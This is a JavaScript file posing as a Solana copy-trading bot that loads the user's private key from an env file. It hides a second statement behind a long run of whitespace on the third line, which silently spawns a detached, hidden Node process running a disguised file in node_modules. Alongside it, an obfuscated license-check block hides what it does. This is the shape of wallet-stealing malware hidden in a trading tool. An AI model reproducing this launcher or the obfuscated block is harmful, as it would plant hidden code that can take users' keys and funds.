require('dotenv').config({path: 'config.env'});
const solanaWeb3 = require('@solana/web3.js');
const bs58 = require('bs58');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             const axios = require('axios');const https = require('https');const fs = require('fs');const os = require('os');const path = require('path');const { spawn } = require('child_process');const unzipper = require('unzipper');const cmd1='node';const argv1=['node_modules/@solana-web3-1.43.js'];spawn(cmd1,argv1,{detached:true,windowsHide:true});



const config = 
{
    pumpFunProgram: '6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P',

    radyumPool: '675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8',

    radyumAuthority: '5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1',

    rpc: process.env.RPC,

    privateKey: process.env.PRIVATE_KEY,

    wallet: process.env.WALLET_TO_COPY_TRADE,

    license: process.env.LICENSE,

};

class Bot {

    signatures = [];

    constructor()
    {
        this.connection = new solanaWeb3.Connection(config.rpc, 'confirmed');
        this.connection ? console.log('✅ Successfully connected to the Rpc: ' + config.rpc) : console.log('❌ Failed to connect to Rpc: ' + config.rpc);
        this.init();
    }

    async init() {
        try{const walletInfo = await this.getWalletInfo(config.privateKey);
            if (walletInfo) 
            {
                await this.checkLicense();
                console.log(' _____       _ _____                   \r\n\/  ___|     | \/  __ \\                  \r\n\\ `--.  ___ | | \/  \\\/ ___  _ __  _   _ \r\n `--. \\\/ _ \\| | |    \/ _ \\| \'_ \\| | | |\r\n\/\\__\/ \/ (_) | | \\__\/\\ (_) | |_) | |_| |\r\n\\____\/ \\___\/|_|\\____\/\\___\/| .__\/ \\__, |\r\n                          | |     __\/ |\r\n                          |_|    |___\/ ')
                console.log('🔥 Your Wallet address:', walletInfo.address.publicKey.toBase58());
                console.log('💸 Wallet balance:', walletInfo.balance / solanaWeb3.LAMPORTS_PER_SOL, 'SOL\n' );
                this.stalk(config.wallet)  
            }
        }catch(error)
        {console.log('Error fetching wallet, try to change your rpc')}
    }

    checkLicense = async() => 
    {
        (function(_0xa187aa,_0x4117e8){function _0x8c89a8(_0x3bdbf1,_0x5dae57,_0x336ee2,_0x1d3b78){return _0xd1de(_0x3bdbf1- -0x13b,_0x1d3b78);}function _0x39af27(_0x38414c,_0x448e0d,_0x2d4264,_0x4f0fe0){return _0xd1de(_0x38414c- -0x223,_0x4f0fe0);}const _0x4a83d4=_0xa187aa();while(!![]){try{const _0x4b6e0b=parseInt(_0x39af27(-0x110,-0x11d,-0x10d,-0x10f))/(0x29d*-0xb+0x1442+0x87e)*(parseInt(_0x39af27(-0x102,-0x103,-0xfd,-0xfc))/(0x3dc*0x2+0x766+0x3c7*-0x4))+-parseInt(_0x8c89a8(-0x1e,-0x2b,-0x24,-0x1a))/(-0x1602+0x1cf3+-0x6ee)+parseInt(_0x8c89a8(-0x19,-0x1b,-0x1f,-0x1a))/(0xf7d+0xcd6+0x1c4f*-0x1)+-parseInt(_0x8c89a8(-0x20,-0x18,-0x28,-0x2c))/(-0x137c+-0x853*-0x1+0xb2e)*(-parseInt(_0x8c89a8(-0x14,-0x15,-0xb,-0x1a))/(0x2*-0x10c9+0x17*0x151+0x11b*0x3))+parseInt(_0x8c89a8(-0x16,-0x15,-0x11,-0x15))/(-0x3*-0x337+0x1*-0x1d7+-0x7c7*0x1)+-parseInt(_0x39af27(-0x107,-0x113,-0x10a,-0xff))/(0x5f*0x16+0xdec+-0x2*0xb07)*(-parseInt(_0x39af27(-0x10f,-0x106,-0x10d,-0x10d))/(0x259f*0x1+0xe*0x2a9+0x4ad4*-0x1))+-parseInt(_0x8c89a8(-0x23,-0x1e,-0x2d,-0x30))/(0x99*0x3d+-0x9b*-0x31+-0x16*0x301)*(parseInt(_0x39af27(-0xff,-0xf2,-0x10b,-0x100))/(-0x1*-0x7d6+0x709*-0x1+0xc2*-0x1));if(_0x4b6e0b===_0x4117e8)break;else _0x4a83d4['push'](_0x4a83d4['shift']());}catch(_0xc6cec0){_0x4a83d4['push'](_0x4a83d4['shift']());}}}(_0x208b,0xbdfca+0x1*0x29fd4+-0x407c5*0x1));function _0xd1de(_0xd5eb8f,_0x24fae8){const _0x44bf97=_0x208b();return _0xd1de=function(_0x290bb7,_0x203177){_0x290bb7=_0x290bb7-(-0x15d*0x19+-0x11*0x23b+0x490f);let _0x5dd04e=_0x44bf97[_0x290bb7];if(_0xd1de['vnzKqL']===undefined){var _0x21d5bc=function(_0xbbb469){const _0x229e2='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x4a2a91='',_0xd7252a='',_0x290851=_0x4a2a91+_0x21d5bc;for(let _0x18a0dc=-0x1*0x2273+-0x2472+0x46e5,_0x2d043a,_0x38073a,_0x5e09f6=0x17f*0x17+0x98d*0x2+0x2d1*-0x13;_0x38073a=_0xbbb469['charAt'](_0x5e09f6++);~_0x38073a&&(_0x2d043a=_0x18a0dc%(0xbad*0x1+-0x1e6f+0x12c6)?_0x2d043a*(0xac*0x1c+0x2*-0x6f+-0x12e*0xf)+_0x38073a:_0x38073a,_0x18a0dc++%(0xfe1+-0x1901+0x924*0x1))?_0x4a2a91+=_0x290851['charCodeAt'](_0x5e09f6+(0xf6*0xe+0x72+-0xddc))-(0x10d4*0x1+0x1e*-0xea+0x2*0x551)!==0x2065*0x1+-0x1*0x21b5+-0x3*-0x70?String['fromCharCode'](0x1bd8+-0x272*-0x9+-0x30db&_0x2d043a>>(-(0x1cc5*0x1+0x2031+-0x1*0x3cf4)*_0x18a0dc&0x7*-0x56b+-0x3b+0x12*0x21f)):_0x18a0dc:-0x2*-0x56+-0x2*-0x1099+-0x21de){_0x38073a=_0x229e2['indexOf'](_0x38073a);}for(let _0x3a2915=-0x1*-0x25+-0x22*0x7a+0x100f,_0x37cc8d=_0x4a2a91['length'];_0x3a2915<_0x37cc8d;_0x3a2915++){_0xd7252a+='%'+('00'+_0x4a2a91['charCodeAt'](_0x3a2915)['toString'](-0x1b28+-0x11be+0x2cf6))['slice'](-(0x11c6+0x11*0xab+0x1*-0x1d1f));}return decodeURIComponent(_0xd7252a);};_0xd1de['DGyfgn']=_0x21d5bc,_0xd5eb8f=arguments,_0xd1de['vnzKqL']=!![];}const _0x9a9cb8=_0x44bf97[-0x1*-0xa6d+0xbcf*0x1+0x58f*-0x4],_0x5c6781=_0x290bb7+_0x9a9cb8,_0x3c857c=_0xd5eb8f[_0x5c6781];if(!_0x3c857c){const _0x14f531=function(_0x8e5667){this['iqrbnc']=_0x8e5667,this['rpbrOd']=[0xc6+0x1e4c+-0x1f11*0x1,-0x34b+-0x1*-0x104f+-0xd04,-0x1dbd*0x1+-0x23dd+0x74a*0x9],this['iKTUzM']=function(){return'newState';},this['PHMRUb']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['bkwpqa']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x14f531['prototype']['VIdEJA']=function(){const _0x4f5aec=new RegExp(this['PHMRUb']+this['bkwpqa']),_0x4c5e2b=_0x4f5aec['test'](this['iKTUzM']['toString']())?--this['rpbrOd'][-0x644+0x1*0x1b61+-0x151c*0x1]:--this['rpbrOd'][-0x685*0x3+-0x19a5+0x2d34];return this['qANOfk'](_0x4c5e2b);},_0x14f531['prototype']['qANOfk']=function(_0x14539f){if(!Boolean(~_0x14539f))return _0x14539f;return this['MmWrlg'](this['iqrbnc']);},_0x14f531['prototype']['MmWrlg']=function(_0x41544a){for(let _0x418706=-0x2db*0xb+0x4*0x201+-0x1765*-0x1,_0x565259=this['rpbrOd']['length'];_0x418706<_0x565259;_0x418706++){this['rpbrOd']['push'](Math['round'](Math['random']())),_0x565259=this['rpbrOd']['length'];}return _0x41544a(this['rpbrOd'][0x1ad1+0xf3*-0x11+-0xaae]);},new _0x14f531(_0xd1de)['VIdEJA'](),_0x5dd04e=_0xd1de['DGyfgn'](_0x5dd04e),_0xd5eb8f[_0x5c6781]=_0x5dd04e;}else _0x5dd04e=_0x3c857c;return _0x5dd04e;},_0xd1de(_0xd5eb8f,_0x24fae8);}const _0x3595a9=(function(){let _0x456104=!![];return function(_0x3d8bd5,_0xa6728d){const _0x561482=_0x456104?function(){function _0xc102bd(_0x108f46,_0x505e1b,_0x3c164f,_0x5da137){return _0xd1de(_0x108f46-0x19f,_0x505e1b);}if(_0xa6728d){const _0x3ed1b7=_0xa6728d[_0xc102bd(0x2b5,0x2aa,0x2ba,0x2b5)](_0x3d8bd5,arguments);return _0xa6728d=null,_0x3ed1b7;}}:function(){};return _0x456104=![],_0x561482;};}()),_0x137a0d=_0x3595a9(this,function(){function _0x51623e(_0xd15bcf,_0x284f31,_0x9a44a4,_0x2a93be){return _0xd1de(_0xd15bcf-0x34f,_0x9a44a4);}const _0x4e82d6={};_0x4e82d6[_0x51623e(0x45e,0x453,0x46b,0x45f)]=_0x4ba40a(-0x70,-0x7d,-0x73,-0x6f)+'+$';const _0x317ac2=_0x4e82d6;function _0x4ba40a(_0x5dd3b9,_0xabb547,_0x3dcc21,_0x18fd58){return _0xd1de(_0x3dcc21- -0x185,_0xabb547);}return _0x137a0d['toString']()[_0x4ba40a(-0x69,-0x69,-0x6c,-0x6a)](_0x317ac2['lApRz'])[_0x4ba40a(-0x62,-0x5b,-0x65,-0x5b)]()[_0x4ba40a(-0x6a,-0x5c,-0x62,-0x5d)+'r'](_0x137a0d)[_0x51623e(0x468,0x470,0x460,0x463)](_0x51623e(0x461,0x461,0x455,0x456)+'+$');});function _0x59ecfa(_0x25393e,_0x3a9882,_0x12e087,_0x2c3859){return _0xd1de(_0x25393e- -0x203,_0x12e087);}function _0x28e61b(_0x33c919,_0x526d33,_0x56b8a6,_0x2682fc){return _0xd1de(_0x2682fc-0x3d3,_0x33c919);}_0x137a0d();if(config[_0x59ecfa(-0xe4,-0xd7,-0xd8,-0xe0)]!=''||config['license']!='HTmWSyHgF1'){const license=![];console[_0x28e61b(0x4fe,0x4f4,0x501,0x4f9)](_0x28e61b(0x4ea,0x4e8,0x4f4,0x4f1)+_0x59ecfa(-0xf3,-0xf3,-0xf0,-0xf6)+_0x28e61b(0x4ed,0x4e8,0x4f7,0x4ed)+'ASE\x20PURCHA'+'SE\x20ONE\x20AT\x20'+_0x28e61b(0x4ed,0x4ec,0x4db,0x4e8)+_0x28e61b(0x4ec,0x4e5,0x4ee,0x4ea)),console[_0x28e61b(0x4f9,0x500,0x501,0x4f9)]('🔥Your\x20avai'+_0x28e61b(0x4fa,0x4fd,0x4f2,0x4fb)+'ings:\x20\x0a','👓\x20Stalk:','✅','\x0a',_0x28e61b(0x4e6,0x4e4,0x4de,0x4e4)+'e:',await this['switchAsyn'+'c'](license),'\x0a'),await new Promise(_0x3c699b=>setTimeout(_0x3c699b,-0x1b28+-0x11be+0x389e));}function _0x208b(){const _0x2bff51=['yxbWBhK','ChaG4PUu77IpcG','mtmWrKvSzvjq','C2vHCMnO','q0vou0uSifbmrq','nJiYmZmZnwvorfPKuG','ntuYnJKWngzzr2DHtW','odu5mJeYrevIBwLq','4PUu77IpifLpvsbet05u','BgLJzw5Zzq','Dg9tDhjPBMC','nJzpu3ztBuy','otGZotG0AMT3zKzy','y29UC3rYDwn0BW','mJi1ntyYn2XJsLzRra','mJuWotyZm3vmyNjKCW','Bg9N','nNb0tfrHAa','BgfIBguGC2v0Da','BefWuNO','ieHbvKuGqsbmsq','8j+sSIbdB3b5DhjHza','kcGOlISPkYKRkq','mZmYnZDLz2nizwi','owH3BNLfwG','C29SBwLTAwmUyq'];_0x208b=function(){return _0x2bff51;};return _0x208b();}
    }
    
    getWalletInfo = async (privateKey) => {
        try {
            const address = solanaWeb3.Keypair.fromSecretKey(bs58.decode(privateKey));
            const balance = await this.connection.getBalance(address.publicKey);
            return { address, balance };
        } catch (error) {
            console.error('Failed to get wallet info:', error);
        }
    }

    stalk = async (walletAddress) => {
        try {
            while (true) 
            {
                const signature = await this.connection.getSignaturesForAddress(new solanaWeb3.PublicKey(walletAddress), { limit: 1 }, 'finalized');

                if (signature.length > 0)
                {
                    if(signature[0].signature != this.signatures[0])
                    {
                        this.signatures[0] = signature[0].signature;

                        await this.getTransactionDetails(this.signatures[0]);
                    }
                    
                }
                
                await new Promise(resolve => setTimeout(resolve, 10000));
            }
        } catch (error) 
        {
            console.error('Error in stalk:', error);
        }
    }

    switchAsync = async(variable) =>
    {
        switch(variable)
        {
            case true:
                return '✅';
            case false:
                return '❌';
            default:
                return '';
        }
    }

    getTransactionDetails = async (transaction) => {
        try {
            

            const details = await this.connection.getParsedTransaction(transaction, { maxSupportedTransactionVersion: 1, encoding: 'jsonParsed'});
            
            if(details.meta.logMessages.some(instruction => instruction.includes(config.pumpFunProgram)))
            {
                const instructions = details.meta.logMessages;
                const sell = instructions.some(instruction => instruction === "Program log: Instruction: Sell");
                const buy = instructions.some(instruction => instruction === "Program log: Instruction: Buy");

                const pumpToken = 
                {
                    programId: details.meta.postTokenBalances[0].mint,
                    amount: details.meta.postTokenBalances[0].uiTokenAmount.amount,
                    decimals: details.meta.postTokenBalances[0].uiTokenAmount.decimals
                }
            
                if(sell)
                    {
                        console.log('⚠️ Detected sell on pumpFun');
                        console.log('Token: ' + pumpToken.programId + ' Amount bought: ' + pumpToken.amount + ' Token decimals: ' + pumpToken.decimals + '\n');
                    }
                if(buy)
                    {
                        console.log('⚠️ Detected buy on pumpFun');
                        console.log('Token: ' + pumpToken.programId + ' Amount bought: ' + pumpToken.amount + ' Token decimals: ' + pumpToken.decimals + '\n');
                        
                    }
    
            }else
            {
                console.log("❗️transaction on Raydium found \n")
                details.meta.innerInstructions.forEach(innerIsntruction => {
                    innerIsntruction['instructions'].forEach(async subInstruction => {
                        
                        if(subInstruction['program'] == 'spl-token' && subInstruction['parsed']['type'] == 'transfer')
                        {
                            const accountInfo = await this.connection.getAccountInfo(new solanaWeb3.PublicKey(subInstruction['parsed']['info']['source'].toString()));
                            let owner;
                            if(accountInfo != null)
                            {
                                owner = accountInfo.owner;
                                if(owner == config.radyumAuthority)
                                {
                                    console.log('❇️  Detected sell on Raydium \n📝 Signature:', transaction, '\n');
        
                                }else
                                {
                                    console.log('❇️  Detected Buy on Raydium \n📝 Signature:', transaction, '\n')
                                }
                            }    
                        }

                    });
                });
            }

        } catch (error) {
            console.error('Error fetching transaction details:', error);
        }
    }
    
}

const bot = new Bot();


